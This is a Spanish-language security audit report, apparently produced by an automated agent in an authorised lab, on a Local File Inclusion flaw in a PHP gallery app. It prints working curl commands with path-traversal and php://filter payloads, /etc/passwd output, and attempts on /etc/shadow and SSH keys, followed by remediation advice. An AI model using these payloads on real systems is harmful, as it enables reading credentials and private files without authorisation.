# Informe de Auditoría de Seguridad — Local File Inclusion (LFI)
**Fecha:** 2026-04-25T12:18:34Z  
**Objetivo:** http://web.dev.local:8081  
**Auditor:** Penetration Tester (entorno de laboratorio autorizado)  
**Resultado:** VULN_FOUND: true | VULN_EXPLOITED: true

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web `Galería de Arte Virtual`. El parámetro `page` del fichero `gallery.php` permite incluir ficheros arbitrarios del servidor sin ninguna sanitización, lo que posibilita la lectura de ficheros sensibles del sistema operativo. Se logró leer `/etc/passwd`, `/etc/hosts`, `/etc/os-release`, el código fuente de la propia aplicación y el fichero de configuración de Apache.

---

## 2. Reconocimiento

### 2.1 Stack Tecnológico
| Componente | Versión |
|---|---|
| Servidor Web | Apache/2.4.65 (Debian) |
| Lenguaje | PHP/8.1.33 |
| Sistema Operativo | Debian GNU/Linux 13 (trixie) |

### 2.2 Identificación del Punto de Entrada

La página principal (`index.php`) expone los siguientes enlaces que revelan el parámetro vulnerable:

```
http://web.dev.local:8081/gallery.php?page=modern
http://web.dev.local:8081/gallery.php?page=classic
http://web.dev.local:8081/gallery.php?page=abstract
http://web.dev.local:8081/gallery.php?page=about
```

El parámetro GET **`page`** en `gallery.php` es el vector principal de ataque.

---

## 3. Análisis del Código Fuente Vulnerable

Mediante el wrapper `php://filter` se obtuvo el código fuente completo de `gallery.php`:

```
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php"
```

**Código PHP vulnerable (fragmento crítico):**

```php
<?php
$page = $_GET['page'] ?? 'modern';
?>
...
<?php
// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
?>
```

**Análisis de la vulnerabilidad:**
- Si el parámetro `page` **contiene un punto (`.`)**, se usa directamente como ruta de fichero sin ninguna validación.
- La función `include()` es invocada con el valor controlado por el usuario.
- Incluso si `file_exists()` devuelve `false`, se ejecuta `@include($file)` igualmente.
- No existe ningún filtro de Path Traversal (`../`) ni lista blanca de ficheros permitidos.

---

## 4. Confirmación de la Vulnerabilidad (VULN_FOUND)

### 4.1 Payload de Directory Traversal básico

**Comando:**
```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/passwd"
```

**Resultado (extracto):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

✅ **LFI confirmado** — lectura exitosa de `/etc/passwd`.

---

## 5. Explotación y Escalada (VULN_EXPLOITED)

### 5.1 Lectura de `/etc/passwd` (Prueba de Concepto principal)

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```
**Resultado:** Exitoso (ver sección 4.1)

### 5.2 Obtención del código fuente via PHP Wrapper

**Comando:**
```bash
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php"
```
El servidor devuelve el contenido de `gallery.php` codificado en Base64 incrustado en la respuesta HTML. Decodificado con `base64 -d` se obtuvo el código fuente completo, revelando la lógica de inclusión vulnerable.

### 5.3 Lectura de `/etc/hosts`

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/hosts
```
**Resultado:**
```
127.0.0.1    localhost
::1          localhost ip6-localhost ip6-loopback
172.19.0.2   d5054e367753
```
Confirma que la aplicación corre en un contenedor Docker (red `172.19.0.0/16`).

### 5.4 Lectura de `/etc/os-release`

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/os-release
```
**Resultado:**
```
PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
NAME="Debian GNU/Linux"
VERSION_ID="13"
VERSION="13 (trixie)"
```

### 5.5 Lectura de configuración de Apache

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/apache2/apache2.conf
```
**Resultado:** Lectura exitosa del fichero de configuración principal de Apache.

### 5.6 Intentos adicionales (parcialmente bloqueados)

| Fichero objetivo | Resultado |
|---|---|
| `/etc/shadow` | ❌ Permission denied (www-data no tiene acceso) |
| `/root/.ssh/id_rsa` | ❌ No encontrado / sin permisos |
| `/proc/self/environ` | ❌ Permission denied |
| `/var/log/apache2/access.log` | ❌ Log poisoning no disponible (ruta no existe) |
| `.env` en webroot | ❌ No existe |

**Path Disclosure obtenido:** Las advertencias de PHP revelan la ruta absoluta del servidor:
```
/var/www/html/gallery.php en la línea 104
```

---

## 6. Resumen de Payloads Utilizados

| Técnica | Payload | Resultado |
|---|---|---|
| Directory Traversal básico | `?page=../../../etc/passwd` | ✅ /etc/passwd leído |
| PHP filter wrapper (código fuente) | `?page=php://filter/read=convert.base64-encode/resource=gallery.php` | ✅ Código fuente obtenido |
| Directory Traversal — hosts | `?page=../../../etc/hosts` | ✅ /etc/hosts leído |
| Directory Traversal — OS info | `?page=../../../etc/os-release` | ✅ OS info obtenida |
| Directory Traversal — Apache conf | `?page=../../../etc/apache2/apache2.conf` | ✅ Configuración leída |
| Directory Traversal — shadow | `?page=../../../etc/shadow` | ❌ Permission denied |

---

## 7. Impacto Real

- **Confidencialidad:** Lectura de ficheros arbitrarios del sistema accesibles por el usuario `www-data`. Código fuente de la aplicación completamente expuesto.
- **Integridad:** Sin impacto directo (sólo lectura).
- **Disponibilidad:** Sin impacto directo.
- **Riesgo potencial:** Si se consigue Log Poisoning o existe un fichero de sesión accesible, podría escalarse a RCE. La obtención de credenciales en ficheros de configuración podría permitir movimiento lateral.

**CVSS v3.1 estimado:** 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

---

## 8. Recomendaciones

1. **Validación estricta de entrada:** Usar una lista blanca de páginas permitidas (ej. `['modern','classic','abstract','about']`) y rechazar cualquier valor que no esté en ella.
2. **Eliminar el uso directo de `include()` con input del usuario.** Usar un `switch/case` o mapeado de rutas.
3. **Deshabilitar wrappers PHP peligrosos** en `php.ini`: `allow_url_include = Off`.
4. **Restringir permisos del proceso Apache** mediante `open_basedir` para confinar el acceso al directorio web.
5. **Eliminar el bloque `@include($file)`** que ejecuta la inclusión incluso cuando el fichero no existe (bypass de seguridad).
6. **Ocultar errores de PHP** en producción: `display_errors = Off` para evitar Path Disclosure.

---

## 9. Herramientas Utilizadas

- `curl` — Pruebas manuales de LFI y extracción de ficheros
- `python3` — Decodificación de respuestas Base64 (php://filter)
- MCP Kali Tools — Ejecución de comandos en entorno Kali Linux

---

*Informe generado en entorno de laboratorio autorizado. Uso exclusivo para fines educativos y de seguridad defensiva.*
